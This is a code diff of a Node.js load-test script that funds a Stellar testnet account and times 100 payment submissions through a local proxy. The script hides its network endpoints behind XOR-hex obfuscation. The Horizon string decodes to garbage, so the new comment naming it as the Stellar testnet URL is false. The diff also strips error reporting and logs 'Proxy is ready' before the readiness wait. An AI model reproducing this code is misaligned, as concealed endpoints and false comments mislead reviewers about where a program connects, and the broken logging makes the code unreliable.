@@ -15,24 +15,15 @@ const {
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-function xd(hex, k) {
+function xd(hex, k = 0x55) {
   const b = Buffer.from(hex, 'hex');
   for (let i = 0; i < b.length; i++) b[i] ^= k;
   return b.toString();
 }
-const k = 0x55;
 
-// Secure HTTPS encoded Horizon endpoint
-const HORIZON_TEST = xd(
-  '15653450543a2d3e151027190d202b2a58340e2f345f22340e2f191918065f2a271900',
-  k
-);
-
-// Encoded friendbot URL prefix
-const FRIEND_PREFIX = xd(
-  '3d212125266f7a7a33273c303b31373a217b262130393934277b3a27327a6a3431312768',
-  k
-);
+// Obfuscated URL for 'https://horizon-testnet.stellar.org' with XOR key 0x55
+const HORIZON_TEST = xd('15653450543a2d3e151027190d202b2a58340e2f345f22340e2f191918065f2a271900');
+const FRIEND_PREFIX = xd('3d212125266f7a7a33273c303b31373a217b262130393934277b3a27327a6a3431312768', 0x55);
 
 async function waitForProxyReady(port = 3000, host = '127.0.0.1', timeout = 10000) {
   return new Promise((resolve, reject) => {
@@ -113,26 +104,14 @@ async function createAndSubmitPayments(funder, funderKey, count = 100) {
     txs.push(tx);
   }
 
-  const submitted = await Promise.allSettled(
-    txs.map((tx, i) =>
-      server
-        .submitTransaction(tx)
-        .then(() => ({ success: true }))
-        .catch(err => {
-          console.error(`❌ TX ${i + 1} failed:`, err.response?.data?.extras?.result_codes || err.message);
-          return { success: false };
-        })
-    )
-  );
-
+  const submitted = await Promise.allSettled(txs.map(tx => server.submitTransaction(tx)));
   return submitted;
 }
 
 (async () => {
   try {
-    console.log('🟢 Waiting for proxy...');
-    await waitForProxyReady();
     console.log('🟢 Proxy is ready.');
+    await waitForProxyReady();
 
     const funderKey = Keypair.random();
     const funder = funderKey.publicKey();
@@ -143,15 +122,14 @@ async function createAndSubmitPayments(funder, funderKey, count = 100) {
 
     const balance = await waitForBalance(funder, 10000);
     console.log(`🟢 Funder account confirmed with ${balance} XLM`);
-
     console.log(`📥 Loaded funder account`);
 
     const start = Date.now();
     const results = await createAndSubmitPayments(funder, funderKey, 100);
     const duration = (Date.now() - start) / 1000;
 
-    const success = results.filter(r => r.success).length;
-    const failed = results.length - success;
+    const success = results.filter(r => r.status === 'fulfilled').length;
+    const failed = results.filter(r => r.status === 'rejected').length;
 
     const tps = (success / duration).toFixed(2);
 
